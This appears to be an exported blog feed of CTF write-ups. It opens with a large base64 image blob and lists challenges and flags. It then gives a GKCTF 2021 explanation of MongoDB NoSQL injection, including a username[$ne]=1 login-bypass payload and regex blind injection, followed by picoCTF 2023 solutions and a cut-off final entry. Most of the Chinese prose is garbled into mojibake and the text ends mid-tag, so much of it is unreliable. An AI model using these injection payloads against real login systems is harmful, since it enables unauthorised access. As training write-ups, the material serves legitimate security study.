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</p><p><img src="/images/others/image-20230401172512705.png" alt="image-20230401172512705"></p><p>flag:flag{a20cb3c9-141c-41c4-8255-0cd3eb95b681}</p><p>Beyond</p><p>æœªè§£ç­”åˆ†å€¼ : 500åˆ†</p><p>åœ¨æŸä¸ªå›½å®¶çº§è¡ŒåŠ¨ä¸­ï¼Œä½œä¸ºè“é˜Ÿç ”åˆ¤ä¸€å“¥çš„è€å¼ æ•è·åˆ°äº†ä¸€ä¸ªç¥ç§˜æµé‡ï¼Œç›´è§‰å‘Šè¯‰ä»–è¿™ä¸ç®€å•ï¼Œäºæ˜¯ä»–å°†è¿™ä¸ªæµé‡ä¿å­˜äº†ä¸‹æ¥ï¼Œä½ èƒ½ååŠ©ä»–å‘ç°å…¶ä¸­çš„ç§˜å¯†å—ï¼Ÿ</p><p><strong>AreYouOK</strong></p><p>åœ¨ä¸€æ¬¡ç¥ç§˜è¡ŒåŠ¨ä¸­ï¼Œç‰¹å·¥è€å¼ çš„æ‰‹æœºé­åˆ°äº†ç ´åï¼Œä¸è¿‡å¥½åœ¨è¿˜æœ‰å°ç±³æ‰‹ç¯ï¼Œç»„ç»‡å‘ä»–çš„æ‰‹ç¯å‘é€äº†è¡ŒåŠ¨æŒ‡ä»¤ï¼Œä½ èƒ½ååŠ©åˆ†æå…¶ä¸­çš„ç§˜å¯†å—ï¼Ÿflagæ ¼å¼ä¸ºflag{Battery_Message}</p><p><a href="https://pan.baidu.com/s/1nGvszy3VWD1SKUs3-zwtGw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/CUe5Gph5">å¤‡ç”¨ä¸‹è½½</a></p><p>lose the key</p><p>æœªè§£ç­”åˆ†å€¼ : 157åˆ†</p><p>é¢˜ç›®å†…å®¹ï¼šlose my keyï¼Œget my likeã€‚</p><p><a href="https://pan.baidu.com/s/1lUE0VcUSLnb2zyK4WcxGEQ">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/ZvlmiWMe">å¤‡ç”¨ä¸‹è½½</a></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>nooblog</p><p>æœªè§£ç­”åˆ†å€¼ : 500åˆ†</p><p>I am just a logic noob trying to talk logically.</p><p><a href="https://pan.baidu.com/s/1gxLc9lbq7mpqjD3G8u-1uw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/z7QclIYK">å¤‡ç”¨ä¸‹è½½</a></p><p><img src="/images/others/image-20230401174456161.png" alt="image-20230401174456161"></p><p><img src="/images/others/image-20230401174257354.png" alt="image-20230401174257354"></p><p><img src="/images/others/image-20230401174445075.png" alt="image-20230401174445075"></p><p>1ã€ã€æå‰ä¸‹è½½ã€‘æŒ‘æˆ˜åŒºä¸€.rarï¼š<a href="https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig">https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig</a> æå–ç ï¼šGAME md5å€¼ï¼š051dbbe806e36d921a579f3a1db16aba æŒ‘æˆ˜åŒºäºŒ.zipï¼š<a href="https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ">https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ</a> æå–ç ï¼šGAME md5å€¼ï¼šc1fff7d2bb8fea7698157267dc16ca0d ï¼ˆè§£å‹å¯†ç å°†åœ¨æ¯”èµ›æ—¶å¯¹åº”é¢˜ç›®æè¿°é‡Œï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF-2021-hackme</title>
      <link href="/2023/03/29/GKCTF-2021-hackme/"/>
      <url>/2023/03/29/GKCTF-2021-hackme/</url>
      
        <content type="html"><![CDATA[<p>å¤ç°åœ°å€ï¼š<a href="https://buuoj.cn/challenges#[GKCTF%202021]hackme">https://buuoj.cn/challenges#[GKCTF%202021]hackme</a></p><p>ç›´æ¥è®¿é—®é¶æœºæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230329165150877.png" alt="image-20230329165150877"></p><p>ç»™äº†æç¤ºï¼šunicode   ,   æ³¨æ„serverå’Œå…¶é…ç½®æ–‡ä»¶</p><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ³¨é‡Šï¼Œ<!--doyounosql?-->ï¼Œè¿™é‡Œæ˜¯ä¸‰ä¸ªå•è¯è€Œä¸æ˜¯å››ä¸ªï¼Œdo you nosqlï¼Ÿ</p><h5 id="ä»€ä¹ˆæ˜¯-Nosql"><a href="#ä»€ä¹ˆæ˜¯-Nosql" class="headerlink" title="ä»€ä¹ˆæ˜¯ Nosql"></a>ä»€ä¹ˆæ˜¯ Nosql</h5><p>NoSQL å³ Not Only SQLï¼Œæ„å³ â€œä¸ä»…ä»…æ˜¯SQLâ€ã€‚åœ¨ç°ä»£çš„è®¡ç®—ç³»ç»Ÿä¸Šæ¯å¤©ç½‘ç»œä¸Šéƒ½ä¼šäº§ç”Ÿåºå¤§çš„æ•°æ®é‡ã€‚è¿™äº›æ•°æ®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ç”±å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰æ¥å¤„ç†ã€‚ é€šè¿‡åº”ç”¨å®è·µè¯æ˜ï¼Œå…³ç³»æ¨¡å‹æ˜¯éå¸¸é€‚åˆäºå®¢æˆ·æœåŠ¡å™¨ç¼–ç¨‹ï¼Œè¿œè¿œè¶…å‡ºé¢„æœŸçš„åˆ©ç›Šï¼Œä»Šå¤©å®ƒæ˜¯ç»“æ„åŒ–æ•°æ®å­˜å‚¨åœ¨ç½‘ç»œå’Œå•†åŠ¡åº”ç”¨çš„ä¸»å¯¼æŠ€æœ¯ã€‚</p><p>NoSQL æ˜¯ä¸€é¡¹å…¨æ–°çš„æ•°æ®åº“é©å‘½æ€§è¿åŠ¨ï¼Œæ—©æœŸå°±æœ‰äººæå‡ºï¼Œå‘å±•è‡³ 2009 å¹´è¶‹åŠ¿è¶Šå‘é«˜æ¶¨ã€‚NoSQLçš„æ‹¥æŠ¤è€…ä»¬æå€¡è¿ç”¨éå…³ç³»å‹çš„æ•°æ®å­˜å‚¨ï¼Œç›¸å¯¹äºé“ºå¤©ç›–åœ°çš„å…³ç³»å‹æ•°æ®åº“è¿ç”¨ï¼Œè¿™ä¸€æ¦‚å¿µæ— ç–‘æ˜¯ä¸€ç§å…¨æ–°çš„æ€ç»´çš„æ³¨å…¥ã€‚</p><h5 id="ä»€ä¹ˆæ˜¯-MongoDB"><a href="#ä»€ä¹ˆæ˜¯-MongoDB" class="headerlink" title="ä»€ä¹ˆæ˜¯ MongoDB"></a>ä»€ä¹ˆæ˜¯ MongoDB</h5><p>MongoDB æ˜¯å½“å‰æœ€æµè¡Œçš„ NoSQL æ•°æ®åº“äº§å“ä¹‹ä¸€ï¼Œç”± C++ è¯­è¨€ç¼–å†™ï¼Œæ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„æ•°æ®åº“ã€‚æ—¨åœ¨ä¸º WEB åº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚MongoDB æ˜¯ä¸€ä¸ªä»‹äºå…³ç³»æ•°æ®åº“å’Œéå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚</p><p>MongoDB å°†æ•°æ®å­˜å‚¨ä¸ºä¸€ä¸ªæ–‡æ¡£ï¼Œæ•°æ®ç»“æ„ç”±é”®å€¼ï¼ˆkey=&gt;valueï¼‰å¯¹ç»„æˆã€‚MongoDB æ–‡æ¡£ç±»ä¼¼äº JSON å¯¹è±¡ã€‚å­—æ®µå€¼å¯ä»¥åŒ…å«å…¶ä»–æ–‡æ¡£ï¼Œæ•°ç»„åŠæ–‡æ¡£æ•°ç»„ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;bohemian&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">19</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Nosql-æ³¨å…¥çš„ç®€ä»‹"><a href="#Nosql-æ³¨å…¥çš„ç®€ä»‹" class="headerlink" title="Nosql æ³¨å…¥çš„ç®€ä»‹"></a>Nosql æ³¨å…¥çš„ç®€ä»‹</h5><p>NoSQL æ³¨å…¥ç”±äº NoSQL æœ¬èº«çš„ç‰¹æ€§å’Œä¼ ç»Ÿçš„ SQL æ³¨å…¥æœ‰æ‰€åŒºåˆ«ã€‚ä½¿ç”¨ä¼ ç»Ÿçš„SQLæ³¨å…¥ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ç”¨æˆ·è¾“å…¥æ¥ä¿®æ”¹æˆ–æ›¿æ¢åº”ç”¨ç¨‹åºå‘é€åˆ°æ•°æ®åº“å¼•æ“çš„ SQL æŸ¥è¯¢è¯­å¥ï¼ˆæˆ–å…¶ä»–SQLè¯­å¥ï¼‰ã€‚<br>æ¢å¥è¯è¯´ï¼ŒSQL æ³¨å…¥ä½¿æ”»å‡»è€…å¯ä»¥åœ¨æ•°æ®åº“ä¸­ SQL æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä¸å…³ç³»æ•°æ®åº“ä¸åŒï¼ŒNoSQL æ•°æ®åº“ä¸ä½¿ç”¨é€šç”¨æŸ¥è¯¢è¯­è¨€ã€‚NoSQL æŸ¥è¯¢è¯­æ³•æ˜¯ç‰¹å®šäºäº§å“çš„ï¼ŒæŸ¥è¯¢æ˜¯ä½¿ç”¨åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ï¼šPHPï¼ŒJavaScriptï¼ŒPythonï¼ŒJava ç­‰ã€‚è¿™æ„å‘³ç€æˆåŠŸçš„æ³¨å…¥ä½¿æ”»å‡»è€…ä¸ä»…å¯ä»¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”å¯ä»¥åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œè¿™å¯èƒ½æ›´åŠ å±é™©ã€‚</p><ul><li><strong>é‡è¨€å¼æ³¨å…¥</strong></li></ul><p>åˆç§°ä¸ºæ°¸çœŸå¼ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚</p><p>é»˜è®¤ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç åçš„username password ä¸ºè¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bohemian&amp;password=<span class="number">657260</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥ PHP åçš„ç¨‹åºæ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;bohemian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;657260&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå°†æ­¤å¸¦åˆ°å…¥åˆ°mongodbä¸­ä¸º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.users.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bohemian&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;657260&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>åœ¨mongodbä¸­æœ‰ä¸€äº›æ¡ä»¶æ“ä½œç¬¦ï¼Œ</p><ul><li><p><code>$eq</code>: (equal)ç­‰äº</p></li><li><p><code>$gt</code>ï¼š(greater than)å¤§çº¦</p></li><li><p><code>$gte</code>: (greater than equal)å¤§çº¦ç­‰äº</p></li><li><p><code>$in</code>ï¼šç­‰äºæ•°ç»„ä¸­çš„æŸä¸€é¡¹ï¼Œ{field:{$in:{value1,value2â€¦}}}</p></li><li><p><code>$lt</code>ï¼š(less than)å°äº</p></li><li><p><code>$lte</code>ï¼š(less than equal)å°äºç­‰äº</p></li><li><p><code>$ne</code>ï¼š(not equal)ä¸ç­‰äº</p></li><li><p><code>$nin</code>ï¼š(not in)ä¸ç­‰äºæ•°ç»„ä¸­çš„ä»»ä½•ä¸€é¡¹</p><p>å¦‚</p></li></ul><p>//æŸ¥è¯¢age = 22çš„è®°å½•</p><p>db.userInfo.find({â€œageâ€: 22});</p><p>//ç›¸å½“äºï¼šselect * from userInfo where age = 22;</p><p>//æŸ¥è¯¢age &gt; 22çš„è®°å½•</p><p>db.userInfo.find({age: {$gt: 22}});</p><p>//ç›¸å½“äºï¼šselect * from userInfo where age &gt; 22;</p><p>å¦‚æœå½“æˆ‘ä»¬è¾“å…¥username[$ne]=1æ—¶ï¼Œå°±ä¼šæˆä¸º</p><p>username=array($ne=&gt;1)  == â€˜usernameâ€™:{$ne:1}</p><p>å¸¦å…¥åˆ°mongodbä¸­db.users.find({â€˜usernameâ€™:{$ne:1}, â€˜passwordâ€™:{$ne:1}})</p><p>å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>$regex</code> æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œç›²æ³¨ï¼Œ <code>$regex</code> å¯ä»¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­ <code>substr()</code> å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> nosql </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF-2023-éƒ¨åˆ†wp</title>
      <link href="/2023/03/27/picoCTF-2023-%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/03/27/picoCTF-2023-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/2023picoctf/image-20230327161915650.png" alt="image-20230327161915650"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h4><p>è®¿é—®é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œè´¦å·å¯†ç <code>test/test!</code></p><p>æŠ“åŒ…çœ‹åˆ°è·³è½¬åˆ°ä¸€ä¸ªé¡µé¢ï¼Œ</p><p>(/images/2023picoctf/image-20230327162639364.png)</p><p><img src="/images/2023picoctf/image-20230327162802078.png" alt="image-20230327162802078"></p><p>è®¿é—®è¿™ä¸ª/next-page/id=cGljb0NURntwcm94aWVzX2Fs</p><p><img src="/images/2023picoctf/image-20230327162857583.png" alt="image-20230327162857583"></p><p>æŠ“åŒ…ï¼Œä¸­é—´åˆä¼šè·³è½¬ä¸€ä¸ªé¡µé¢ï¼Œç›´æ¥è·³å‡ºæ¥ä¸€ä¸ªé¡µé¢ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªidï¼Œå¥½åƒæ˜¯base64ï¼Œç›´æ¥æ‹¼æ¥</p><p><img src="/images/2023picoctf/image-20230327164821310.png" alt="image-20230327164821310"></p><p>flag:picoCTF{proxies_all_the_way_a0fe074f}</p><h4 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h4><p>How to automate tasks to run at intervals on linux servers?</p><p>æœºç¿»ï¼šå¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ä»¥åœ¨ Linux æœåŠ¡å™¨ä¸Šå®šæœŸè¿è¡Œï¼Ÿ</p><p>ç»™äº†è´¦å·å¯†ç ç«¯å£ï¼Œç›´æ¥è¿ä¸Šå»</p><p>å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤  crontab  ï¼Œæ‰§è¡Œcrontab -l å‘ç°æ²¡æœ‰ï¼Œcrontabçš„æ–‡ä»¶ç›®å½•åœ¨/etc/ä¸‹  ä»¥cronå¼€å¤´ï¼Œ</p><p><img src="/images/2023picoctf/image-20230327165914627.png" alt="image-20230327165914627"></p><p>åœ¨ challengeç›®å½•ä¸‹ä¹Ÿæœ‰flag</p><p><img src="/images/2023picoctf/image-20230327170454662.png" alt="image-20230327170454662"></p><p>flag:{â€œflagâ€: â€œpicoCTF{Sch3DUL7NG_T45K3_L1NUX_1d781160}â€, â€œusernameâ€: â€œpicoplayerâ€, â€œpasswordâ€: â€œdd4yT2bR</p><h4 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h4><p>Every file gets a flag.<br>The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what</p><p>æœºç¿»ä¸€ä¸‹ï¼šæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªæ ‡å¿—ã€‚<br>SOC åˆ†æå¸ˆçœ‹åˆ°ä¸€å¼ å›¾åƒåœ¨ä¸¤ä¸ªäººä¹‹é—´æ¥å›å‘é€ã€‚ ä»–ä»¬å†³å®šå±•å¼€è°ƒæŸ¥ï¼Œå‘ç°äº‹æƒ…è¿œä¸æ­¢äºæ­¤</p><p>ç›´æ¥ä¸‹è½½ä¸€å¼ å›¾ç‰‡</p><p>foremost æœ‰ä¸€ä¸ªzipåŒ…</p><p><img src="/images/2023picoctf/image-20230327173305594.png" alt="image-20230327173305594"></p><p><img src="/images/2023picoctf/image-20230327173324858.png" alt="image-20230327173324858"></p><p>ristretto flag.png</p><p><img src="/images/2023picoctf/image-20230327173335655.png" alt="image-20230327173335655"></p><p>flag:pIcoCTF{Hiddinng_An_imag3_within_@n_ima9e_96539bea}</p><h4 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h4><p>æ­£åˆ™åŒ¹é…</p><p>è¾“å…¥æ¡†è¾“å…¥ä¸œè¥¿ï¼Œ</p><p><img src="/images/2023picoctf/image-20230327204642026.png" 